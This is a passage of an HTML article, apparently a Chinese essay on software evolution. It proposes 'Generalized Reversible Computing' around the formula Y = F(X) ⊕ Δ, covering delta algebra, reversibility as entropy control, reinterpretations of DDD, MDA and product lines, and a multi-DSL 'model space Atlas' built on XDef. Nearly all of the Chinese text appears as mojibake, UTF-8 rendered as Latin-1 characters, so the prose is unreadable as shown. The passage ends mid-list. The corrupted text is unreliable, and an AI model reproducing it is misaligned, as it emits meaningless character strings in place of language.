<li>AOP æä¾›äº†ä¸€ç§â€œç»‡å…¥å¼å·®é‡â€ï¼Œä½†åˆ‡ç‚¹æ˜¯åŸºäºè„†å¼±çš„ä»£ç æ¨¡å¼ï¼›</li>
<li>Lenses/BX æŠŠ Î” å¼•å…¥è§†å›¾æ›´æ–°é—®é¢˜ï¼Œä½†é€šå¸¸åªåœ¨ Aâ†”B ä¸¤ä¸ªæ¨¡å‹çš„åŒæ­¥èŒƒå›´å†…ã€‚</li>
</ul>
<p>è¿™äº›å·®é‡å­˜åœ¨çš„é—®é¢˜æ˜¯ï¼š</p>
<ul>
<li>è¯­ä¹‰ä¸ç»Ÿä¸€ï¼›</li>
<li>å…¬ç†ä¸æ˜ç¡®ï¼›</li>
<li>å±‚æ¬¡æ··ä¹±ï¼ˆæ–‡æœ¬çº§ã€è¯­æ³•çº§ã€è¯­ä¹‰çº§æ··åœ¨ä¸€èµ·ï¼‰ã€‚</li>
</ul>
<p>ç¼ºçš„æ˜¯ï¼š</p>
<blockquote>
<p>åœ¨â€œæ¨¡å‹/DSLç©ºé—´â€ä¸­ï¼Œå»ºç«‹ç»Ÿä¸€çš„<strong>å·®é‡ä»£æ•°</strong>ï¼š</p>
<ul>
<li>æ˜ç¡®å®šä¹‰ Î” çš„ç»“æ„ï¼›</li>
<li>å®šä¹‰ âŠ• çš„é—­åŒ…ã€ç»“åˆå¾‹ã€å•ä½å…ƒã€å±€éƒ¨é€†ï¼›</li>
<li>æŠŠå¯è¿½è¸ªã€å¯åˆå¹¶ã€å¯å›æ»šã€å¯é€†è¿™äº›éœ€æ±‚ï¼Œå˜æˆä»£æ•°æ€§è´¨ã€‚</li>
</ul>
</blockquote>
<p>æ¢å¥è¯è¯´ï¼š</p>
<ul>
<li>æˆ‘ä»¬æ— æ•°æ¬¡åœ¨å®è·µé‡Œâ€œå‘æ˜â€å·®é‡ï¼šschema diffã€config overlayã€patchã€pluginï¼›</li>
<li>å´æ²¡æœ‰æŠŠå®ƒä»¬æ‹‰å›åŒä¸€å¼ é»‘æ¿ä¸Šï¼Œç”¨åŒä¸€å¥—ç¬¦å·å’Œå…¬ç†æ¥åˆ»ç”»ã€‚</li>
</ul>
<p>è€Œä¼ ç»Ÿç±»å‹ç³»ç»Ÿçš„ç­‰ä»·ç±»æ€ç»´ï¼Œæœ¬èƒ½å…³æ³¨çš„æ˜¯â€œå“ªäº›å€¼æ˜¯åŒä¸€ç±»â€ï¼Œè€Œä¸æ˜¯â€œä¸€ä¸ªç»“æ„ä½ç‚¹ä¸Šçš„å¾®æ‰° Î” å¦‚ä½•å åŠ ã€ç›¸æ¶ˆã€å¯é€†â€ï¼Œè¿™ä½¿å¾—å·®é‡å’Œåœºè®ºå¤©ç„¶è¢«æ’é™¤åœ¨ç†è®ºè§†é‡ä¹‹å¤–ã€‚</p>
<h3 data-id="heading-11">3.3 è¯­è¨€è¢«å®šä¹‰æˆâ€œè¯­æ³• + ç±»å‹ + æ±‚å€¼è§„åˆ™â€ï¼Œè€Œä¸æ˜¯â€œç»“æ„ç©ºé—´ + åæ ‡ + æ¼”åŒ–è·¯å¾„â€</h3>
<p>ä¸»æµå¯¹è¯­è¨€çš„éšå«å®šä¹‰ï¼š</p>
<blockquote>
<p>è¯­æ³•ï¼ˆBNFï¼‰ + ç±»å‹ç³»ç»Ÿ + æ“ä½œè¯­ä¹‰ï¼ˆæˆ– denotational semanticsï¼‰</p>
</blockquote>
<p>å®ƒå›ç­”çš„æ˜¯ï¼š</p>
<ul>
<li>å“ªäº›è¡¨è¾¾å¼æ˜¯åˆæ³•çš„ï¼Ÿ</li>
<li>å®ƒä»¬å¦‚ä½•è¿è¡Œï¼Ÿ</li>
</ul>
<p>ä½†å®ƒä¸ç›´æ¥å›ç­”ï¼š</p>
<ul>
<li>è¿™é—¨è¯­è¨€èƒ½ç”Ÿæˆçš„<strong>å…¨éƒ¨ç¨‹åºç»“æ„ S</strong> æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>åœ¨ S ä¸Šï¼Œä»€ä¹ˆæ˜¯â€œåˆæ³•å˜å½¢/æ¼”åŒ– Î”â€ï¼Ÿ</li>
<li>Î” å¦‚ä½•ç»„åˆã€æ˜¯å¦å¯é€†ã€æ˜¯å¦æœ‰åº¦é‡ï¼Ÿ</li>
<li>ä¸€æ¡æ¼”åŒ–è·¯å¾„ Î”â‚ âŠ• Î”â‚‚ âŠ• â€¦ âŠ• Î”â‚™ çš„â€œå½¢çŠ¶â€å¯ä»¥æ€æ ·åˆ†æï¼Ÿ</li>
</ul>
<p>å¦‚æœä¸å…ˆæŠŠâ€œç»“æ„ç©ºé—´â€å½“æˆè¯­è¨€æœ¬ä½“ï¼Œè¦è°ˆï¼š</p>
<ul>
<li>åœºï¼ˆfieldï¼‰ï¼›</li>
<li>å¾®æ‰°ï¼ˆperturbationï¼‰ï¼›</li>
<li>æ¼”åŒ–è·¯å¾„ä¸Šçš„ç´¯è®¡æ•ˆåº”ï¼ˆç±»ä¼¼ç§¯åˆ†ï¼‰ï¼›</li>
</ul>
<p>éƒ½ä¼šéå¸¸å°´å°¬ã€‚</p>
<p>è€Œå¦‚æœæ”¹ç”¨ GRC å¼çš„å®šä¹‰ï¼š</p>
<blockquote>
<p>ä¸€é—¨è¯­è¨€å®šä¹‰äº†ä¸€ç§ç¨‹åºç»“æ„ç©ºé—´ Sï¼Œ<br/>
è¯­è¨€æ˜¯æ„é€  S ä¸­å…ƒç´ çš„è§„åˆ™ï¼Œ<br/>
å¹¶åœ¨ S ä¸Šç»™å‡ºå·®é‡ Î” ä¸åˆå¹¶ âŠ• çš„è¯­ä¹‰ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆç¨‹åº/æ¨¡å‹ä¸å†åªæ˜¯â€œè¯­æ³•æ ‘â€ï¼Œ<br/>
è€Œæ˜¯â€œç©ºé—´ä¸Šçš„ç‚¹â€ï¼›æ¼”åŒ–æ“ä½œå°±æ˜¯â€œåœ¨ç©ºé—´ä¸Šæ–½åŠ çš„ Î”â€ã€‚</p>
<p>ä»è¿™ä¸ªè§†è§’å†çœ‹ç°å®è¯­è¨€ï¼Œå°±èƒ½çœ‹åˆ°å·®å¼‚ï¼š</p>
<ul>
<li>å¸¸è§„è¯­è¨€ï¼šBNF + ç±»å‹è§„åˆ™ + æ±‚å€¼è¯­ä¹‰ï¼Œä½†ä¸æ˜¾å¼ç»™å‡ºâ€œç»“æ„ç©ºé—´ + Î” è§„åˆ™â€ï¼›</li>
<li>XLangï¼š
<ul>
<li>æœ‰ XDef ä½œä¸ºç»Ÿä¸€å…ƒæ¨¡å‹ï¼Œå®šä¹‰é¢†åŸŸç»“æ„åæ ‡ï¼›</li>
<li>åœ¨æ¯ä¸ªåæ ‡ç‚¹æ”¯æŒ (data, ext_data) è¿™ç§â€œä¸»ä½“ + æ‰©å±•â€çš„æˆå¯¹ç»“æ„ï¼›</li>
<li>å†…ç½®å·®é‡å åŠ è§„åˆ™ï¼Œä¸ <code>Y = F(X) âŠ• Î”</code> èŒƒå¼è‡ªç„¶å¥‘åˆã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-12">3.4 è½¯ä»¶äº§å“çº¿ / å¤šæ¨¡å‹ååŒç¼ºä¹ç»Ÿä¸€â€œç©ºé—´è§‚â€</h3>
<p>ç°å®çš„å¤§å‹ç³»ç»Ÿï¼Œå­˜åœ¨å¤§é‡ä¸åŒå±‚æ¬¡çš„æ¨¡å‹ï¼š</p>
<ul>
<li>æ•°æ®æ¨¡å‹ï¼ˆORM/Schemaï¼‰ï¼›</li>
<li>ä¸šåŠ¡æµç¨‹ï¼ˆWorkflow DSLï¼‰ï¼›</li>
<li>UI æè¿°ï¼›</li>
<li>é…ç½®ï¼›</li>
<li>ä»£ç ï¼›</li>
<li>éƒ¨ç½²æ‹“æ‰‘ï¼ˆKubernetes YAML ç­‰ï¼‰ã€‚</li>
</ul>
<p>è¿™äº› artifact ä¹‹é—´å­˜åœ¨æ˜ å°„å…³ç³»ï¼Œä½†ï¼š</p>
<ul>
<li>å¤§å¤šæ•°å·¥å…·åªåœ¨æŸä¸€å±‚åšä¸€ç‚¹è½¬æ¢ï¼ˆORM ç”Ÿæˆ DAOã€API ç”Ÿæˆ SDK ç­‰ï¼‰ï¼›</li>
<li>æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€â€œæ¨¡å‹ç©ºé—´ Atlasâ€çš„æ¡†æ¶ï¼ŒæŠŠè¿™äº›æ¨¡å‹è§†ä¸ºä¸åŒè¡¨è±¡çš„â€œåŒä¸€è¯­ä¹‰æ ¸å¿ƒâ€çš„å¤šç§è¡¨ç¤ºï¼›</li>
<li>å˜åŒ–å¾€å¾€åœ¨æŸä¸€å±‚ç¡¬ patchï¼Œæ— æ³•ç³»ç»Ÿåœ°åå‘ä¼ æ’­æˆ–åŒæ­¥åˆ°å…¶ä»–å±‚ã€‚</li>
</ul>
<p>è¿™å¯¼è‡´ï¼š<br/>
å¤šæ¨¡å‹ç³»ç»Ÿçš„æ¼”åŒ– = å„å±‚åˆ†åˆ«æ¼”åŒ– + äººå·¥åŒæ­¥ + ä¸æ–­ç´¯ç§¯æ¦‚å¿µæ¼‚ç§»ã€‚</p>
<p><strong>ä¸¥é‡ç¼ºé™·å°±æ˜¯ï¼šæˆ‘ä»¬æ²¡æœ‰æŠŠå¤šæ¨¡å‹ååŒå½“ä½œä¸€ä¸ªâ€œå¤šåæ ‡ç³» + å¯é€†å˜æ¢ + å·®é‡ä¼ æ’­â€çš„ç»Ÿä¸€é—®é¢˜æ¥å»ºæ¨¡ã€‚</strong></p>
<hr/>
<h2 data-id="heading-13">å››ã€å¹¿ä¹‰å¯é€†è®¡ç®—(GRC)ï¼šä»¥â€œç»“æ„ç©ºé—´ + Î” + âŠ•â€ä¸ºä¸­å¿ƒçš„æ¼”åŒ–èŒƒå¼</h2>
<p>å‰é¢æè¿°çš„æ˜¯ç¼ºå£ï¼Œä¸‹é¢å¼•å…¥ GRCï¼Œä½œä¸ºä¸€ä¸ªå·²ç»éƒ¨åˆ†æˆå‹çš„è¡¥å…¨æ–¹å‘ã€‚</p>
<h3 data-id="heading-14">4.1 ä¸€ä¸ªæ ¸å¿ƒå…¬å¼ï¼šY = F(X) âŠ• Î”</h3>
<p>GRC ç”¨ä¸€ä¸ªç»Ÿä¸€å…¬å¼åˆ»ç”»è½¯ä»¶æ„é€ ä¸æ¼”åŒ–ï¼š</p>
<pre><code class="hljs language-text" lang="text">App = Delta x-extends Generator&lt;DSL&gt;
å³ Y = F(X) âŠ• Î”
</code></pre>
<p>è§£é‡Šï¼š</p>
<ul>
<li>Yï¼šç›®æ ‡ç³»ç»Ÿï¼ˆåº”ç”¨ï¼‰ï¼›</li>
<li>Xï¼šæ¨¡å‹ï¼ˆDSL å®ä¾‹ï¼‰ï¼›</li>
<li>F(X)ï¼šç”± Generator æ ¹æ® DSL/æ¨¡å‹ç”Ÿæˆçš„ä¸»ä½“éƒ¨åˆ†ï¼›</li>
<li>Î”ï¼šå·®é‡ï¼Œç”¨äºå®šåˆ¶ã€è°ƒæ•´ã€è¡¥å……ï¼›</li>
<li>âŠ•ï¼šå·®é‡åˆå¹¶è¿ç®—ï¼Œè¦æ±‚å…·å¤‡æ˜ç¡®çš„ä»£æ•°å±æ€§ï¼ˆè‡³å°‘ç»“æ„å±‚é¢ä¸Šçš„ç»“åˆã€å•ä½å…ƒã€é—­åŒ…ï¼‰ã€‚</li>
</ul>
<p>è¿™å¯ä»¥ä»ä¸‰ç§è§†è§’ç†è§£ï¼š</p>
<ol>
<li>å·¥ç¨‹è§†è§’ï¼š<strong>ç»“æœ = ç”Ÿæˆçš„ä¸»ä½“ + å¯æ§çš„å·®é‡</strong>ï¼›</li>
<li>æ•°å­¦è§†è§’ï¼šç±»ä¼¼å°æ³¢åˆ†æçš„â€œè¿‘ä¼¼ + ç»†èŠ‚â€åˆ†è§£ï¼›</li>
<li>å“²å­¦è§†è§’ï¼šä»â€œé™æ€å®ä½“â€çš„æœ¬ä½“è®ºè½¬å‘â€œç”Ÿæˆä¸æ¼”åŒ–â€çš„è¿‡ç¨‹æœ¬ä½“è®ºã€‚</li>
</ol>
<p>è¿™æ¡å…¬å¼å¯ä»¥åœ¨æ‰€æœ‰å±‚çº§é€’å½’å±•å¼€ï¼š</p>
<ul>
<li>åº”ç”¨å±‚ï¼šApp = Generator(DomainDSL) âŠ• Î”_app</li>
<li>æ¨¡å‹å±‚ï¼šDomainDSL = DslGenerator(MetaModel) âŠ• Î”_dsl</li>
<li>å…ƒæ¨¡å‹å±‚ï¼šMetaModel' = MetaModel âŠ• Î”_metamodel</li>
<li>å·¥å…·å±‚ï¼šGenerator2 = Generator1 âŠ• Î”_generator</li>
</ul>
<p>ä¸€æ—¦æ¥å—è¿™ä¸ªå…¬å¼ï¼Œå¾ˆå¤šä¼ ç»ŸçŸ›ç›¾å¯ä»¥ç³»ç»ŸåŒ–é‡å†™ï¼š</p>
<ul>
<li>
<p>æ ‡å‡†åŒ– vs çµæ´»æ€§ï¼š</p>
<ul>
<li>F(X) è¿½æ±‚æè‡´æ ‡å‡†åŒ–ã€è‡ªåŠ¨åŒ–ï¼›</li>
<li>Î” æä¾›æè‡´å®šåˆ¶ã€çµæ´»æ€§ï¼›</li>
<li>âŠ• ä¿è¯ç»„åˆä»å¯æ§ã€å¯è¿½è¸ªã€‚</li>
</ul>
</li>
<li>
<p>ç”Ÿæˆ vs æ‰‹å·¥ä¿®æ”¹ï¼š</p>
<ul>
<li>ä¸å†æ˜¯â€œç”Ÿæˆ + ä¸å¯é‡æ”¾çš„ manual hackâ€ï¼›</li>
<li>è€Œæ˜¯â€œç”Ÿæˆ + æ˜¾å¼ç»“æ„åŒ– Î”â€ï¼›</li>
</ul>
</li>
<li>
<p>æ ¸å¿ƒäº§å“ vs å®¢æˆ·å®šåˆ¶ï¼š</p>
<ul>
<li>Effective System = Base âŠ• Î”_Industry âŠ• Î”_Region âŠ• Î”_Customerï¼›</li>
<li>æ ¸å¿ƒæ¼”åŒ–ä¸å®¢æˆ·å·®å¼‚è¢«åˆ†è§£åœ¨ä¸åŒ Î” å­ç©ºé—´ã€‚</li>
</ul>
</li>
</ul>
<p>æ¢å¥è¯è®²ï¼š</p>
<blockquote>
<p>è¿™æ¡å…¬å¼æŠŠâ€œæ„é€ â€å’Œâ€œæ¼”åŒ–â€ç»Ÿä¸€æˆ<strong>åŒä¸€ç§æ“ä½œ</strong>ï¼šå åŠ  Î”ã€‚</p>
</blockquote>
<ul>
<li>æ„é€ ï¼ˆç”Ÿæˆï¼‰å’Œæ¼”åŒ–ï¼ˆå®šåˆ¶ï¼‰åªæ˜¯åœ¨ä¸åŒå±‚ã€ä¸åŒåæ ‡ç³»ä¸Šçš„ Î” å åŠ ï¼›</li>
<li>å¤æ‚ç³»ç»Ÿ = å¤šå±‚ Generator + å¤šå±‚ Î” çš„çºµæ¨ªé€’å½’åˆ†è§£ã€‚</li>
</ul>
<h3 data-id="heading-15">4.2 ä¸€åˆ‡çš†å·®é‡ï¼ˆEverything is a Deltaï¼‰</h3>
<p>åœ¨æœ‰å¹ºå…ƒçš„ä»£æ•°ç»“æ„é‡Œï¼Œä»»ä½•å¯¹è±¡éƒ½å¯ä»¥è¢«çœ‹æˆï¼š</p>
<blockquote>
<p>A = 0 âŠ• A</p>
</blockquote>
<p>æ‰€ä»¥åœ¨è½¯ä»¶ä¸–ç•Œé‡Œï¼Œå®Œå…¨å¯ä»¥è¿™æ ·çœ‹ï¼š</p>
<ul>
<li>â€œä¸€ä¸ªå®Œæ•´ç³»ç»Ÿâ€æœ¬èº«å°±æ˜¯ä»â€œæ— â€åˆ°â€œæœ‰â€çš„ä¸€å¤§å¨ Î”_genesisï¼›</li>
<li>æ‰€æœ‰åç»­ä¿®æ”¹éƒ½æ˜¯åœ¨è¿™å¨ Î” ä¸Šç»§ç»­å åŠ æ›´å¤š Î”ï¼›</li>
<li>å…‹éš† + ä¿®æ”¹ä¸€ä¸ªç³»ç»Ÿï¼Œå…¶å®æ˜¯â€œå¯¹ç°æœ‰ç³»ç»Ÿåº”ç”¨ä¸€ä¸ª Î”_cloneâ€ã€‚</li>
</ul>
<p>äºæ˜¯ï¼Œâ€œä¸€åˆ‡çš†å·®é‡â€ä¸æ˜¯å£å·ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p>æŠŠâ€œå…¨é‡â€è§†ä¸ºâ€œç›¸å¯¹äºå•ä½å…ƒçš„ä¸€æ¬¡ Î”â€ã€‚</p>
</blockquote>
<p>åœ¨è¿™ä¸ªè§†è§’ä¸‹ï¼Œè¯­è¨€ã€DSLã€å·¥å…·ï¼Œéƒ½éœ€è¦å›ç­”ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>å®ƒçš„ç»“æ„ç©ºé—´ S æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>åœ¨ S ä¸Šï¼Œå·®é‡ Î” çš„åŸºæœ¬â€œè¯­æ³•å•ä½â€æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>âŠ• çš„ä»£æ•°æ€§è´¨æ˜¯ä»€ä¹ˆï¼ˆå°é—­ã€ç»“åˆã€å•ä½å…ƒã€å±€éƒ¨é€†ç­‰ï¼‰ï¼Ÿ</li>
</ol>
<p>åªæœ‰å›ç­”äº†è¿™ä¸‰ä¸ªé—®é¢˜ï¼Œæ‰ç®—åœ¨è¿™é—¨è¯­è¨€/æ¨¡å‹ä¸ŠçœŸæ­£å…·å¤‡â€œæ¼”åŒ–çš„ç†è®ºâ€ã€‚</p>
<h3 data-id="heading-16">4.3 å¼•å…¥å¯é€†æ€§ï¼šç”¨é€†å…ƒæ¥æ§åˆ¶ç†µå¢</h3>
<p>ä»ç‰©ç†å­¦ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š</p>
<ul>
<li>ç†µå¢æ˜¯ä¸å¯é¿å…çš„ï¼›</li>
<li>ä½†å¯é€†è¿‡ç¨‹ç†µä¿æŒä¸å˜ï¼Œè¶Šä¸å¯é€†ï¼Œç†µå¢è¶Šå¤§ã€‚</li>
</ul>
<p>åœ¨è½¯ä»¶ä¸–ç•Œé‡Œï¼Œå®Œå…¨ä¸€æ ·ï¼š</p>
<ul>
<li>æ¯æ¬¡ä¸´æ—¶ hackã€è€¦åˆã€ä¸ç»“æ„åŒ–æ”¹å˜ï¼Œéƒ½åœ¨å¢åŠ ç³»ç»Ÿâ€œæ··ä¹±åº¦â€ï¼›</li>
<li>ä¸€å®šæ—¶é—´åï¼Œå°±æ¼”å˜ä¸ºâ€œæ²¡äººæ•¢åŠ¨â€çš„é—äº§ä»£ç ã€‚</li>
</ul>
<p>å¯é€†è®¡ç®—æå‡ºï¼š</p>
<ul>
<li>å°½é‡è®©æ¯ä¸ªå±€éƒ¨æ“ä½œéƒ½æœ‰é…å¯¹çš„é€†æ“ä½œï¼›</li>
<li>å¦‚æœå„ä¸ªå±€éƒ¨å¯é€†ï¼Œä¸”ç»„åˆå…³ç³»ä¹Ÿå¯é€†ï¼Œåˆ™æ•´ä½“å¯é€†ï¼›</li>
<li>å¯é€†æ€§è¶Šå¼ºï¼Œç³»ç»Ÿæ¼”åŒ–æ—¶â€œç»“æ„ä¿¡æ¯â€çš„æŸè€—è¶Šå°ï¼Œç›¸å½“äºç†µå¢å—æ§ã€‚</li>
</ul>
<p>åœ¨è½¯ä»¶å®è·µä¸­ï¼Œè¿™å…·ä½“è½åœ°ä¸ºï¼š</p>
<ul>
<li>å·®é‡ Î” å°½é‡æ˜¯å¯é€†çš„ï¼›</li>
<li>åˆå¹¶ âŠ• é‡è§†â€œå¦‚ä½•å¯æ‹†è§£/å›æ»šæŸä¸ª Î”â€ï¼›</li>
<li>å®¢æˆ·å®šåˆ¶ã€è¡Œä¸šç‰¹åŒ–ï¼Œå°½é‡é›†ä¸­åˆ°å¯å‰¥ç¦»ã€å¯æŠ›å¼ƒçš„ Î”_customer ä¸­ï¼Œè€Œä¸æ˜¯ä¾µå…¥æ ¸å¿ƒã€‚</li>
</ul>
<p>è¿™ä¸â€œæŠŠç†µå¢é›†ä¸­åœ¨å·®é‡é‡Œâ€çš„æƒ³æ³•å¯¹åº”ï¼š</p>
<blockquote>
<p>æ ¸å¿ƒæ¨¡å‹ä¿æŒä½ç†µï¼Œå®¢æˆ·çš„éšæœºæ€§ã€å¶ç„¶æ€§é›†ä¸­åœ¨ä¸€ä¸ªå¯åˆ†ç¦»çš„å·®é‡å±‚ä¸­ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>å¯é€†æ€§ä¸åªæ˜¯â€œæ–¹ä¾¿ undoâ€ï¼Œ</li>
<li>è€Œæ˜¯<strong>å»¶ç¼“å’Œå±€é™ç†µå¢ï¼Œå»¶é•¿ç³»ç»Ÿå¯ç»´æŠ¤å¯¿å‘½çš„æ‰‹æ®µ</strong>ã€‚</li>
</ul>
<h3 data-id="heading-17">4.4 ä¸ DDD / MDA / SPL çš„ç»Ÿä¸€è§£é‡Š</h3>
<p>GRC å¹¶ä¸æ˜¯è¦æ¨ç¿»å·²æœ‰æ–¹æ³•ï¼Œè€Œæ˜¯ç»™å‡ºç»Ÿä¸€è§£é‡Šï¼š</p>
<ul>
<li>MDAï¼š<br/>
ä¼ ç»Ÿ <code>App = Transformer(Model)</code> â†’ GRC ä¸­æ˜¯ <code>App = Generator(Model) âŠ• Î”</code>ï¼Œ<br/>
ç”Ÿæˆä¸å®šåˆ¶ç»Ÿä¸€ï¼Œè§£å†³æ¨¡å‹ä¸ä»£ç å‰²è£‚é—®é¢˜ã€‚</li>
<li>SPL / å¤ç”¨ï¼š<br/>
ä» â€œA &gt; Bï¼ˆç»§æ‰¿ï¼‰â€ã€â€œA = B + Cï¼ˆç»„ä»¶ï¼‰â€<br/>
åˆ° â€œB = A + (-C)â€ å’Œ <code>Base âŠ• Î”_Industry âŠ• Î”_Region âŠ• Î”_Customer</code>ï¼Œ<br/>
è®©â€œç›¸å…³å³å¯å¤ç”¨â€ï¼Œå¹¶éš”ç¦»æ ¸å¿ƒäº§å“ä¸å®šåˆ¶æ¼”åŒ–ã€‚</li>
<li>DDDï¼š<br/>
åœ¨â€œç©ºé—´-æ—¶é—´-è¯­è¨€-å˜åŒ–â€å››ç»´ä¸Šé‡è¯» DDDï¼š
<ul>
<li>ç©ºé—´ï¼šé™ç•Œä¸Šä¸‹æ–‡æ˜¯ç›¸å¯¹ç©ºé—´ï¼Œé˜²è…å±‚æ˜¯åæ ‡å˜æ¢ï¼›</li>
<li>æ—¶é—´ï¼šé¢†åŸŸäº‹ä»¶æ˜¯çŠ¶æ€ç©ºé—´ä¸Šçš„å·®é‡ Î”ï¼ˆ<code>NewState = OldState âŠ• Event</code>ï¼‰ï¼›</li>
<li>è¯­è¨€ï¼šé€šç”¨è¯­è¨€ / DSL æ˜¯åæ ‡ç³»ï¼›</li>
<li>å˜åŒ–ï¼šæ¼”åŒ–æ˜¯åœ¨åæ ‡ç³»ä¸Šä»»æ„ç‚¹çš„æ‰°åŠ¨ã€‚</li>
</ul>
</li>
</ul>
<p>ç ”ç©¶é‡ç‚¹è½¬å‘ï¼š</p>
<ul>
<li>å¦‚ä½•è®¾è®¡ Fï¼ˆç”Ÿæˆå™¨ï¼‰è®©åŸºæ€ç»“æ„å°½å¯èƒ½â€œç®€å•ã€è§„èŒƒã€è¯­ä¹‰æ¸…æ™°â€ï¼›</li>
<li>å¦‚ä½•è®¾è®¡ Î” çš„æ•°æ®ç»“æ„å’Œ âŠ• çš„ä»£æ•°æ€§è´¨ï¼Œè®©æ¼”åŒ–å¯ç»„åˆã€å¯å›æ»šã€å¯åˆå¹¶ã€å±€éƒ¨å¯é€†ã€‚</li>
</ul>
<p>è¿™å…¶å®æ˜¯åœ¨è½¯ä»¶å·¥ç¨‹ä¸­å¼•å…¥ä¸€å¥—â€œç¦»æ•£å¾®ç§¯åˆ†â€ï¼šå±€éƒ¨å¾®æ‰°ï¼ˆÎ”ï¼‰ã€è·¯å¾„ç§¯åˆ†ï¼ˆâŠ• çš„è¿­ä»£ï¼‰ã€å±€éƒ¨é€†ï¼ˆå¯æ’¤é”€çš„å˜æ›´ï¼‰ï¼Œä»è€Œæœ‰æœºä¼šç”¨ç†µã€å¯é€†æ€§ç­‰æ¦‚å¿µæ¥åˆ»ç”»æ¼”åŒ–è´¨é‡ã€‚</p>
<h3 data-id="heading-18">4.5 å¤š DSL / å¤šæ¨¡å‹ / å¤šè¡¨è±¡ï¼šä¸€ä¸ªâ€œæ¨¡å‹ç©ºé—´ Atlasâ€</h3>
<p>ç°å®ä¸­ä½ ä¼šæœ‰ï¼š</p>
<ul>
<li>é¢†åŸŸ DSLï¼ˆä¸šåŠ¡è§„åˆ™ã€å·¥ä½œæµã€æƒé™ç­‰ï¼‰ï¼›</li>
<li>æ•°æ®æ¨¡å‹ DSLï¼ˆORMã€schemaï¼‰ï¼›</li>
<li>UI DSLï¼›</li>
<li>é…ç½® DSLï¼›</li>
<li>Excel è¡¨æ ¼ã€å¯è§†åŒ–ç¼–è¾‘å™¨ä½œä¸ºå¦ä¸€ç§è¡¨è±¡ã€‚</li>
</ul>
<p>å¯é€†è®¡ç®—è§†è§’ä¸‹ï¼š</p>
<ul>
<li>å®ƒä»¬æ˜¯åŒä¸€è¯­ä¹‰ä¸–ç•Œçš„ä¸åŒåæ ‡ç³»ï¼›</li>
<li>è¯­è¨€å·¥ä½œå°çš„ç»Ÿä¸€å…ƒæ¨¡å‹ï¼ˆXDefï¼‰ç»™å‡ºâ€œå…±åŒçš„ç»“æ„ç©ºé—´â€ï¼›</li>
<li>åˆ©ç”¨ lens/BX/transform åœ¨ä¸åŒè¡¨è±¡ä¹‹é—´è¿›è¡Œå¯é€†ï¼ˆæˆ–å¯æ§æŸå¤±ï¼‰çš„å˜æ¢ï¼›</li>
<li>æ¯ä¸ªè¡¨è±¡ä¸‹çš„ Î” å¯ä»¥é€šè¿‡ transform æ˜ å°„åˆ° canonical ç»“æ„ç©ºé—´ä¸­çš„ Î”ã€‚</li>
</ul>
<p>è¿™å°±æŠŠï¼š</p>
<ul>
<li>MDAã€Xtextã€è¯­è¨€å·¥ä½œå°ã€DSL å·¥ç¨‹ï¼›</li>
<li>BX/lensã€æ¨¡å‹åŒæ­¥ï¼›</li>
<li>Excel/GUI ä¸æ–‡æœ¬/AST çš„äº’è½¬ï¼›</li>
</ul>
<p>éƒ½ç»Ÿä¸€åˆ°ä¸€å¼ æ›´å¤§çš„å›¾æ™¯é‡Œï¼š<br/>
<strong>ä¸€ä¸ªå¤šåæ ‡ç³»çš„æ¨¡å‹ç©ºé—´ Atlasï¼Œä¸Šé¢è¿è¡Œç€ Î” ä¸ âŠ• çš„æ¼”åŒ–ã€‚</strong></p>
<p>GRC åœ¨å®è·µä¸­é€šè¿‡â€œè¯­è¨€å·¥ä½œå°â€ä½“ç°è¿™ä¸€ç‚¹ï¼š</p>
<ul>
<li><strong>ç»Ÿä¸€å…ƒæ¨¡å‹ï¼ˆXDefï¼‰</strong>ï¼šæ‰€æœ‰ DSL åŸºäºåŒä¸€å…ƒæ¨¡å‹å®šä¹‰ï¼Œå®ç°æ— ç¼åµŒå…¥ä¸ååŒã€‚</li>
<li><strong>å†…ç½®å·®é‡æœºåˆ¶ï¼ˆx-extendsï¼‰</strong>ï¼šå˜åŒ–åœ¨ DSL å±‚å°±æ˜¯ä¸€ç­‰å…¬æ°‘ï¼Œä¿è¯å„ DSL é—´åˆå¹¶è¯­ä¹‰ä¸€è‡´ã€‚</li>
<li><strong>å¤šé‡è¡¨è±¡</strong>ï¼šåŒä¸€æ¨¡å‹å¯ä»¥åœ¨ XML / JSON / Excel / å¯è§†åŒ–è®¾è®¡å™¨é—´æ— æŸè½¬æ¢ï¼Œå®ç°â€œæ¨å¯¼ + ä¿®æ­£â€çš„å·¥ä½œæ¨¡å¼ï¼š
<ul>
<li>æ¨å¯¼ï¼šä»è§„èŒƒ DSL è‡ªåŠ¨ç”Ÿæˆ artifactï¼›</li>
<li>ä¿®æ­£ï¼šé€šè¿‡ Î” å¯¹ç”Ÿæˆç»“æœåšéä¾µå…¥å¼è¡¥å……å’Œå¾®è°ƒã€‚</li>
</ul>
</li>
</ul>
<p>å¦‚æœè¿™å¥—ç”¨æ³•æˆä¸ºä¸»æµï¼Œæˆ‘ä»¬ä¼šè‡ªç„¶æŠŠï¼š</p>
<ul>
<li>å„ç§æ¨¡å‹ç©ºé—´ï¼ˆDSLã€Excelã€JSONã€å¯è§†è§†å›¾â€¦ï¼‰</li>
<li>å„ç§è¡¨è±¡ä¹‹é—´çš„å˜æ¢ï¼ˆè§£æã€ç”Ÿæˆã€ç¼–è¾‘å™¨ï¼‰</li>
<li>å·®é‡åœ¨å„è¡¨è±¡ä¹‹é—´çš„å¯¹åº”</li>
</ul>
<p>ç»Ÿä¸€åˆ°â€œèŒƒç•´/å‡½å­/ä¼´éšâ€è¿™ä¸ªå±‚æ¬¡ä¸Šã€‚<br/>
è€Œä¸æ˜¯ç»§ç»­æŠŠèŒƒç•´é”åœ¨ç±»å‹ä¸–ç•Œé‡Œã€‚è¿™æ›´ç¬¦åˆèŒƒç•´è®ºçš„æœ¬ä¹‰ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>æŠŠ Excel æ–‡ä»¶ç©ºé—´çœ‹ä½œä¸€ä¸ªèŒƒç•´ï¼›</li>
<li>æŠŠ DSL æ¨¡å‹ç©ºé—´çœ‹ä½œå¦ä¸€ä¸ªèŒƒç•´ï¼›</li>
